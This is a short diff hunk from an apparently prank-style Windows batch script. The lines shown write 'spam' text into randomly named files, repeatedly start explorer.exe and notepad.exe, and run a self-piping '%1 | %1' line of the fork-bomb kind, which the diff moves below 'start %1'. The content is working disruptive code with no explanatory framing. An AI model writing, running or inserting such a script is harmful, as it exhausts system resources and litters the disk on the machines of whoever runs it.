@@ -28,5 +28,5 @@ echo spamspamspamspamspamspamspam > %random%\%random%
 echo spamspamspamspamspamspamspam > %random%
 start explorer.exe
 start notepad.exe
-%1 | %1
 start %1
+%1 | %1
